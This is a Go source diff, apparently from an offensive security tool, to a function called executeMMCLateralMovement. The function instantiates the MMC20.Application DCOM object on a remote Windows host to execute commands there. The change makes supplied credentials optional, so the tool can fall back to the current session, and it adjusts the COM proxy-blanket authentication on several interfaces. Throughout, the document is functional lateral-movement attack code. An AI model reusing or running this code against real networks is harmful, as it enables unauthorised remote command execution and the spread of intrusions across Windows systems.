@@ -129,7 +129,7 @@ func executeMMCLateralMovement(username, password, domain, targetHost, command s
 	}
 	defer procCoUninitialize.Call()
 
-	// Initialize COM Security with proper authentication level
+	// Initialize COM security
 	hr, _, _ = procCoInitializeSecurity.Call(
 		0,                                        // Security descriptor (NULL)
 		uintptr(0xFFFFFFFF),                      // -1, let COM choose
@@ -154,67 +154,66 @@ func executeMMCLateralMovement(username, password, domain, targetHost, command s
 			return fmt.Errorf("failed to get CLSID for MMC20.Application: %v", err)
 		}
 	}
-
-	// Create authentication identity structure for the credentials
-	var authIdentity SEC_WINNT_AUTH_IDENTITY_W
-
-	// Format credentials
-	var domainStr, usernameStr string
-	if domain != "" {
-		domainStr = domain
-		usernameStr = username
-	} else {
-		// Use only username if no domain provided
-		domainStr = ""
-		usernameStr = username
-	}
-
-	// Convert strings to UTF16
-	domainPtr, err := syscall.UTF16FromString(domainStr)
-	if err != nil {
-		return fmt.Errorf("failed to convert domain to UTF16: %v", err)
-	}
-
-	usernamePtr, err := syscall.UTF16FromString(usernameStr)
-	if err != nil {
-		return fmt.Errorf("failed to convert username to UTF16: %v", err)
-	}
-
-	passwordPtr, err := syscall.UTF16FromString(password)
-	if err != nil {
-		return fmt.Errorf("failed to convert password to UTF16: %v", err)
-	}
-
-	// Set up identity structure
-	if len(domainPtr) > 0 {
-		authIdentity.Domain = &domainPtr[0]
-		authIdentity.DomainLength = uint32(len(domainPtr) - 1) // -1 to exclude null terminator
-	}
-	authIdentity.User = &usernamePtr[0]
-	authIdentity.UserLength = uint32(len(usernamePtr) - 1)
-	authIdentity.Password = &passwordPtr[0]
-	authIdentity.PasswordLength = uint32(len(passwordPtr) - 1)
-	authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE
-
-	authInfo := COAUTHINFO{
-		dwAuthnSvc:           RPC_C_AUTHN_WINNT,
-		dwAuthzSvc:           RPC_C_AUTHZ_NONE,
-		pwszServerPrincName:  nil,
-		dwAuthnLevel:         RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
-		dwImpersonationLevel: RPC_C_IMP_LEVEL_IMPERSONATE,
-		pAuthIdentityData:    uintptr(unsafe.Pointer(&authIdentity)),
-		dwCapabilities:       EOAC_NONE,
-	}
-
 	serverNamePtr, err := syscall.UTF16PtrFromString(targetHost)
 	if err != nil {
 		return fmt.Errorf("failed to convert server name to UTF16: %v", err)
 	}
+
 	serverInfo := COSERVERINFO{
 		dwReserved1: 0,
 		pwszName:    serverNamePtr,
-		pAuthInfo:   uintptr(unsafe.Pointer(&authInfo)),
+		pAuthInfo:   0,
 		dwReserved2: 0,
+	}
+	var authIdentity SEC_WINNT_AUTH_IDENTITY_W
+	if username != "" {
+		// START USER AUTH
+		// Create authentication identity structure for the credentials
+		// Format credentials
+		var domainStr, usernameStr string
+		if domain != "" {
+			domainStr = domain
+			usernameStr = username
+		} else {
+			// Use only username if no domain provided
+			domainStr = ""
+			usernameStr = username
+		}
+		// Convert strings to UTF16
+		domainPtr, err := syscall.UTF16FromString(domainStr)
+		if err != nil {
+			return fmt.Errorf("failed to convert domain to UTF16: %v", err)
+		}
+		usernamePtr, err := syscall.UTF16FromString(usernameStr)
+		if err != nil {
+			return fmt.Errorf("failed to convert username to UTF16: %v", err)
+		}
+		passwordPtr, err := syscall.UTF16FromString(password)
+		if err != nil {
+			return fmt.Errorf("failed to convert password to UTF16: %v", err)
+		}
+		// Set up identity structure
+		if len(domainPtr) > 0 {
+			authIdentity.Domain = &domainPtr[0]
+			authIdentity.DomainLength = uint32(len(domainPtr) - 1) // -1 to exclude null terminator
+		}
+		authIdentity.User = &usernamePtr[0]
+		authIdentity.UserLength = uint32(len(usernamePtr) - 1)
+		authIdentity.Password = &passwordPtr[0]
+		authIdentity.PasswordLength = uint32(len(passwordPtr) - 1)
+		authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE
+
+		authInfo := COAUTHINFO{
+			dwAuthnSvc:           RPC_C_AUTHN_WINNT,
+			dwAuthzSvc:           RPC_C_AUTHZ_NONE,
+			pwszServerPrincName:  nil,
+			dwAuthnLevel:         RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
+			dwImpersonationLevel: RPC_C_IMP_LEVEL_IMPERSONATE,
+			pAuthIdentityData:    uintptr(unsafe.Pointer(&authIdentity)),
+			dwCapabilities:       EOAC_NONE,
+		}
+		// END USER AUTH
+		serverInfo.pAuthInfo = uintptr(unsafe.Pointer(&authInfo))
 	}
 
 	// Set up the interface query
@@ -259,15 +258,25 @@ func executeMMCLateralMovement(username, password, domain, targetHost, command s
 
 	// Set the proxy blanket for the IDispatch interface
 	// This is essential for remote calls to work properly with authentication
-	hr = setProxyBlanket(uintptr(unsafe.Pointer(disp)),
-		RPC_C_AUTHN_WINNT,               // Authentication service
-		RPC_C_AUTHZ_NONE,                // Authorization service
-		nil,                             // Server principal name
-		RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
-		RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
-		&authIdentity,                   // Authentication identity
-		EOAC_NONE)                       // Capabilities
-
+	if username != "" {
+		hr = setProxyBlanket(uintptr(unsafe.Pointer(disp)),
+			RPC_C_AUTHN_WINNT,               // Authentication service
+			RPC_C_AUTHZ_NONE,                // Authorization service
+			nil,                             // Server principal name
+			RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
+			RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
+			&authIdentity,                   // Authentication identity
+			EOAC_NONE)                       // Capabilities
+	} else {
+		hr = setProxyBlanket(uintptr(unsafe.Pointer(disp)),
+			RPC_C_AUTHN_WINNT,               // Authentication service
+			RPC_C_AUTHZ_NONE,                // Authorization service
+			nil,                             // Server principal name
+			RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
+			RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
+			nil,                             // Authentication identity
+			EOAC_NONE)                       // Capabilities
+	}
 	if hr != 0 {
 		return fmt.Errorf("failed to set proxy blanket on IDispatch: 0x%X", hr)
 	}
@@ -285,15 +294,25 @@ func executeMMCLateralMovement(username, password, domain, targetHost, command s
 	}
 
 	// Set proxy blanket for the Document interface
-	hr = setProxyBlanket(uintptr(unsafe.Pointer(documentDisp)),
-		RPC_C_AUTHN_WINNT,               // Authentication service
-		RPC_C_AUTHZ_NONE,                // Authorization service
-		nil,                             // Server principal name
-		RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
-		RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
-		&authIdentity,                   // Authentication identity
-		EOAC_NONE)                       // Capabilities
-
+	if username != "" {
+		hr = setProxyBlanket(uintptr(unsafe.Pointer(documentDisp)),
+			RPC_C_AUTHN_WINNT,               // Authentication service
+			RPC_C_AUTHZ_NONE,                // Authorization service
+			nil,                             // Server principal name
+			RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
+			RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
+			&authIdentity,                   // Authentication identity
+			EOAC_NONE)                       // Capabilities
+	} else {
+		hr = setProxyBlanket(uintptr(unsafe.Pointer(documentDisp)),
+			RPC_C_AUTHN_WINNT,               // Authentication service
+			RPC_C_AUTHZ_NONE,                // Authorization service
+			nil,                             // Server principal name
+			RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
+			RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
+			nil,                             // Authentication identity
+			EOAC_NONE)                       // Capabilities
+	}
 	if hr != 0 {
 		return fmt.Errorf("failed to set proxy blanket on Document: 0x%X", hr)
 	}
@@ -310,15 +329,25 @@ func executeMMCLateralMovement(username, password, domain, targetHost, command s
 	}
 
 	// Set proxy blanket for the ActiveView interface
-	hr = setProxyBlanket(uintptr(unsafe.Pointer(activeViewDisp)),
-		RPC_C_AUTHN_WINNT,               // Authentication service
-		RPC_C_AUTHZ_NONE,                // Authorization service
-		nil,                             // Server principal name
-		RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
-		RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
-		&authIdentity,                   // Authentication identity
-		EOAC_NONE)                       // Capabilities
-
+	if username != "" {
+		hr = setProxyBlanket(uintptr(unsafe.Pointer(activeViewDisp)),
+			RPC_C_AUTHN_WINNT,               // Authentication service
+			RPC_C_AUTHZ_NONE,                // Authorization service
+			nil,                             // Server principal name
+			RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
+			RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
+			&authIdentity,                   // Authentication identity
+			EOAC_NONE)                       // Capabilities
+	} else {
+		hr = setProxyBlanket(uintptr(unsafe.Pointer(activeViewDisp)),
+			RPC_C_AUTHN_WINNT,               // Authentication service
+			RPC_C_AUTHZ_NONE,                // Authorization service
+			nil,                             // Server principal name
+			RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
+			RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
+			nil,                             // Authentication identity
+			EOAC_NONE)                       // Capabilities
+	}
 	if hr != 0 {
 		return fmt.Errorf("failed to set proxy blanket on ActiveView: 0x%X", hr)
 	}
@@ -359,7 +388,12 @@ func CLSIDFromProgID(progID string) (clsid *ole.GUID, err error) {
 }
 
 // CoCreateInstanceEx creates a COM object on a possibly remote server
-func CoCreateInstanceEx(clsid *ole.GUID, outer *ole.IUnknown, clsContext uint32, server *COSERVERINFO, countQI uint32, pResults *MULTI_QI) (hresult uintptr) {
+func CoCreateInstanceEx(clsid *ole.GUID,
+	outer *ole.IUnknown,
+	clsContext uint32,
+	server *COSERVERINFO,
+	countQI uint32,
+	pResults *MULTI_QI) (hresult uintptr) {
 	hresult, _, _ = procCoCreateInstanceEx.Call(
 		uintptr(unsafe.Pointer(clsid)),
 		uintptr(unsafe.Pointer(outer)),
@@ -378,8 +412,15 @@ func setProxyBlanket(punk uintptr,
 	pServerPrincName *uint16,
 	dwAuthnLevel uint32,
 	dwImpLevel uint32,
-	pAuthInfo *SEC_WINNT_AUTH_IDENTITY_W,
+	pAuthInfo interface{}, // Can be nil or *SEC_WINNT_AUTH_IDENTITY_W
 	dwCapabilities uint32) (hresult uintptr) {
+
+	var pAuthInfoPtr uintptr
+	if pAuthInfo != nil {
+		pAuthInfoPtr = uintptr(unsafe.Pointer(pAuthInfo.(*SEC_WINNT_AUTH_IDENTITY_W)))
+	} else {
+		pAuthInfoPtr = 0
+	}
 
 	hresult, _, _ = procCoSetProxyBlanket.Call(
 		punk,
@@ -388,7 +429,7 @@ func setProxyBlanket(punk uintptr,
 		uintptr(unsafe.Pointer(pServerPrincName)),
 		uintptr(dwAuthnLevel),
 		uintptr(dwImpLevel),
-		uintptr(unsafe.Pointer(pAuthInfo)),
+		pAuthInfoPtr,
 		uintptr(dwCapabilities),
 	)
 	return
